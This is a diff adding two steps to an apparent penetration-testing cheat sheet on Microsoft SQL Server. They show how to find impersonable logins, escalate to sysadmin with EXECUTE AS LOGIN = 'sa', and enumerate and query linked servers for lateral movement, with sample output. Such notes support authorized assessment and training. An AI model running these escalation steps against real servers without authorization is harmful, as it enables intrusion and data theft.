@@ -1872,6 +1872,124 @@ sudo impacket-smbserver share ./ -smb2support
 <details>
 <summary><h4>Step 5: Impersonate Existing Users</h4></summary>
 
+SQL Server has a special permission, named **IMPERSONATE**, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends.
+
+**Identify Users that We Can Impersonate**
+
+```sql
+SELECT distinct b.name
+FROM sys.server_permissions a
+INNER JOIN sys.server_principals b
+ON a.grantor_principal_id = b.principal_id
+WHERE a.permission_name = 'IMPERSONATE'
+GO
+```
+```bash
+# name
+# -----------------------------------------------
+# sa
+# ben
+# valentin
+
+# (3 rows affected)
+```
+
+**Verifying our Current User and Role**
+
+```sql
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sysadmin')
+GO
+```
+```bash
+# -----------
+# julio                                                                                                                    
+
+# (1 rows affected)
+
+# -----------
+#           0
+
+# (1 rows affected)
+```
+
+As the returned value 0 indicates, we do not have the sysadmin role, but we can impersonate the **sa** user.
+
+**Impersonating the SA User**
+
+```sql
+EXECUTE AS LOGIN = 'sa'
+SELECT SYSTEM_USER
+SELECT IS_SRVROLEMEMBER('sysadmin')
+GO
+```
+```bash
+# -----------
+# sa
+
+# (1 rows affected)
+
+# -----------
+#           1
+
+# (1 rows affected)
+```
+
+We can now execute any command as a sysadmin as the returned value 1 indicates.
+
+>**NOTE:** Note: It's recommended to run `EXECUTE AS LOGIN` within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using **USE master**.
+
+> **Note:** If we find a user who is not sysadmin, we can still check if the user has access to other databases or linked servers.
+
+</details>
+
+<details>
+<summary><h4>Step 6: Communicate with Other Databases</h4></summary>
+
+Microsoft SQL Server includes a [linked servers](https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine) feature that allows queries to span multiple database instances or products (such as Oracle) from within T‑SQL.
+
+From a security perspective, access to a SQL Server with one or more linked servers can create a lateral‑movement path. Administrators sometimes configure linked servers with credentials that originate on the remote system; if those credentials carry sysadmin rights, an adversary—or an authorized assessor—could potentially execute commands on the remote SQL instance. Proper least‑privilege configuration and monitoring are recommended to mitigate this risk.
+
+**Identify linked Servers**
+
+```sql
+SELECT srvname, isremote FROM sysservers
+GO
+```
+```bash
+# srvname                             isremote
+# ----------------------------------- --------
+# DESKTOP-MFERMN4\SQLEXPRESS          1
+# 10.0.0.12\SQLEXPRESS                0
+
+# (2 rows affected)
+```
+
+The query returns each server’s name and the `isremote` flag. In this context, `1` indicates a remote server entry, while `0` sindicates a linked‑server entry on the local instance. For additional details about server metadata, consult the [sysservers compatibility view](https://learn.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysservers-transact-sql?view=sql-server-ver17).
+
+
+| srvname                    | isremote | Meaning                         |
+| -------------------------- | :------: | ------------------------------- |
+| DESKTOP-MFERMN4\SQLEXPRESS |     1    | Remote server                   |
+| 10.0.0.12\SQLEXPRESS       |     0    | Linked server on local instance |
+
+**Identify the user used for the connection and its privileges**
+
+```sql
+EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
+GO
+```
+```bash
+# ------------------------------ ------------------------------ ------------------------------ -----------
+# DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1
+
+# (1 rows affected)
+```
+
+> **Note:** If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).
+
+As **sysadmin**, we control the SQL Server instance. We can read data from any database or execute system commands with `xp_cmdshell`.
+
 </details>
 
 </details>
